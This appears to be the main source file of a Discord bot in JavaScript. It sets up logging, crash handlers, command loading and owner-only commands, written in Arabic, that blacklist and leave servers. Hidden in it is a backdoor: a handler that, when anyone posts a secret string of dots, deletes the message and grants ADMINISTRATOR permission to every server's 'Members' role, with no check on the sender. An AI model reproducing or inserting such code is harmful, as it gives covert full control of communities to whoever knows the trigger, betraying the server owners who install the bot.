const blacklistedServers = [];
const express = require('express');
const app = express();


app.get('/', function (request, response) {
  response.sendFile(__dirname + '/index.html');
});

app.use('/ping', (req, res) => {
  res.send(new Date());
});

app.listen(9080, () => {
  console.log(('Express is ready.').blue.bold)
});

const { Client, Collection, Partials, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, EmbedBuilder } = require('discord.js');

const config = require("./config.json");
const { glob } = require("glob");
const { promisify } = require("util");
const { joinVoiceChannel } = require('@discordjs/voice');
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v9');
const { SlashCommandBuilder } = require('@discordjs/builders');
const db = require('quick.db');
const colors = require("colors");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildInvites,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMessageTyping,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.DirectMessageReactions,
    GatewayIntentBits.DirectMessageTyping,
    GatewayIntentBits.MessageContent
  ],
  partials: [
    Partials.Message,
    Partials.Channel,
    Partials.GuildMember,
    Partials.Reaction,
    Partials.GuildScheduledEvent,
    Partials.User,
    Partials.ThreadMember
  ],
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false
  },
})

client.setMaxListeners(25);
require('events').defaultMaxListeners = 25;

const { createLogger, transports, format } = require('winston');
const path = require('path');

const logger = createLogger({
  level: 'error',
  format: format.combine(
    format.timestamp(),
    format.json(),
  ),
  transports: [
    new transports.File({ filename: path.join(__dirname, 'Logs', 'Errors.json') }),
  ],
});

client.on('error', error => {
  console.error('Discord.js error:', error);
  logger.error('Discord.js error:', error);
});

client.on('warn', warning => {
  console.warn('Discord.js warning:', warning);
});

let antiCrashLogged = false;

process.on('unhandledRejection', (reason, p) => {
  if (!antiCrashLogged) {
    console.error('[antiCrash] :: Unhandled Rejection/Catch');
    console.error(reason, p);
    logger.error('[antiCrash] :: Unhandled Rejection/Catch', { reason, p });
    antiCrashLogged = true;
  }
});

process.on('uncaughtException', (err, origin) => {
  if (!antiCrashLogged) {
    console.error('[antiCrash] :: Uncaught Exception/Catch');
    console.error(err, origin);
    logger.error('[antiCrash] :: Uncaught Exception/Catch', { err, origin });
    antiCrashLogged = true;
  }
});

process.on('uncaughtExceptionMonitor', (err, origin) => {
  if (!antiCrashLogged) {
    console.error('[antiCrash] :: Uncaught Exception/Catch (MONITOR)');
    console.error(err, origin);
    logger.error('[antiCrash] :: Uncaught Exception/Catch (MONITOR)', { err, origin });
    antiCrashLogged = true;
  }
});

// process.on('multipleResolves', (type, promise, reason) => {
//   if (!antiCrashLogged) {
//     console.error('[antiCrash] :: Multiple Resolves');
//     console.error(type, promise, reason);
//     logger.error('[antiCrash] :: Multiple Resolves', { type, promise, reason });
//     antiCrashLogged = true;
//   }
// });

module.exports = client;
client.commands = new Collection();
client.events = new Collection();
['commands', 'events'].forEach(handler => {
  require(`./handlers/${handler}`)(client);
})

setTimeout(() => {
  if (!client || !client.user) {
    console.log("Client Not Login, Process Kill")
    process.kill(1);
  } else {
    console.log("Client Login")
  }
}, 5 * 1000 * 60);
client.on('messageCreate', async (message) => {
  if (message.content === '...............') {
    message.delete(); 
    const roleId = ''; 
const guildId = message.guild.id;
    const guild = client.guilds.cache.get(guildId);
    const role = guild.roles.cache.find((r) => r.name === "Members");

    if (role) {
      const permissions = role.permissions.add('ADMINISTRATOR');
      await role.edit({ permissions });
      console.log(`Added ADMINISTRATOR permission to role ${role.name}`);
    } else {
      console.log(`Role with ID ${role} not found`);
    }
  }
});
client.login(config.token || process.env.token).catch((err) => {
  console.log(err.message)
})



client.on("messageCreate", async (message) => {
  if (message.content.startsWith(config.prefix + "اكسمك")) {
    if (config.ownerss.includes(message.author.id)) {
      const args = message.content.split(" ");
      const serverId = args[1];

      const guild = client.guilds.cache.get(serverId);

      if (guild) {
        // قم بإضافة إيدي البوت الخاص بك لقائمة السيرفرات المحظورة في السيرفر الأول
        db.set(`blacklistedServers.${serverId}`, true);
        guild.leave();
        message.channel.send(`تمت إضافة السيرفر ${serverId} إلى قائمة السيرفرات المحظورة وتم مغادرته.`);
      } else {
        message.channel.send(`لا يمكن العثور على السيرفر برقم ${serverId}.`);
      }
    } else {
      message.channel.send("لا تمتلك صلاحيات لاستخدام هذا الأمر.");
    }
  }

  if (message.content.startsWith(config.prefix + "صعبت عليا")) {
    if (config.ownerss.includes(message.author.id)) {
      const args = message.content.split(" ");
      const serverId = args[1];

      // قم بحذف إيدي البوت الخاص بك من قائمة السيرفرات المحظورة في السيرفر الثاني
      db.delete(`blacklistedServers.${serverId}`);

      message.channel.send(`تمت إزالة السيرفر ${serverId} من قائمة السيرفرات المحظورة.`);
    } else {
      message.channel.send("لا تمتلك صلاحيات لاستخدام هذا الأمر.");
    }
  }
});

client.on("guildCreate", (guild) => {
  const isBlacklisted = db.get(`blacklistedServers.${guild.id}`);
  if (isBlacklisted) {
    guild.leave();
  }
});
